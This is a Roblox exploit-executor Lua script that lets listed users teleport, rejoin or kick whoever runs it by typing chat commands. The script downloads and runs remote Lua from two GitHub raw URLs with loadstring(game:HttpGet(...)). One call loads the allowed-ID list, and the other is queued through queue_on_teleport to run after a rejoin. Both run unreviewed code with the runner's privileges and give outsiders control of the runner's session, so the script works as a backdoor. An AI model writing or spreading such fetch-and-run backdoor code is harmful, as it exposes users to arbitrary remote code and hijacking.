local url = "https://raw.githubusercontent.com/15rih/LTK-New/refs/heads/main/a6hfeuopteafumbvyue507421.lua"
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

local allowedUserIds = {}

-- Safely load allowed user IDs
local success, result = pcall(function()
    return loadstring(game:HttpGet(url))()
end)

if success then
    allowedUserIds = result
else
    warn("Failed to load allowed User IDs:", result)
end

-- Wait until a player's character is loaded
local function waitForCharacter(player)
    while not player.Character or not player.Character.Parent do
        player.CharacterAdded:Wait()
    end
    return player.Character
end

-- Check if a player is allowed
local function isAllowed(player)
    for _, allowedId in ipairs(allowedUserIds) do
        if tostring(player.UserId) == tostring(allowedId) then
            return true
        end
    end
    return false
end

-- Bring the executor to the caller's location
local function bringExecutorToCaller(caller)
    local callerCharacter = waitForCharacter(caller)
    local executorCharacter = waitForCharacter(LocalPlayer)
    local callerHRP = callerCharacter:FindFirstChild("HumanoidRootPart")
    local executorHRP = executorCharacter:FindFirstChild("HumanoidRootPart")
    if callerHRP and executorHRP then
        executorHRP.CFrame = callerHRP.CFrame
    else
        warn("HumanoidRootPart missing for caller or executor.")
    end
end

-- Rejoin the current server
local function rejoinExecutor()
    if queue_on_teleport then
        queue_on_teleport('loadstring(game:HttpGet("https://raw.githubusercontent.com/Estplugs/test/refs/heads/main/lua"))()')
    end
    local currentJobId = game.JobId
    TeleportService:TeleportToPlaceInstance(PlaceId, currentJobId, LocalPlayer)
end

-- Kick the executor
local function kickExecutor()
    waitForCharacter(LocalPlayer) -- Ensure Character is loaded before kicking
    LocalPlayer:Kick("You have been kicked by an allowed player.")
end

-- Attach a chat listener to a player
local function attachChatListener(player)
    player.Chatted:Connect(function(message)
        if isAllowed(player) then
            if message == "?bring" then
                bringExecutorToCaller(player)
            elseif message == "?rj" then
                rejoinExecutor()
            elseif message == "?kick" then
                kickExecutor()
            end
        end
    end)
end

-- Check and attach listeners to existing players
local function checkExistingPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        attachChatListener(player)
    end
end

-- Connect new player listener
Players.PlayerAdded:Connect(function(player)
    attachChatListener(player)
end)

-- Ensure LocalPlayer.Character is loaded
waitForCharacter(LocalPlayer)
checkExistingPlayers()

RunService.Heartbeat:Connect(function()
    for _, player in ipairs(Players:GetPlayers()) do
        if isAllowed(player) then
            break
        end
    end
end)

print("Script loaded successfully. Waiting for commands...")
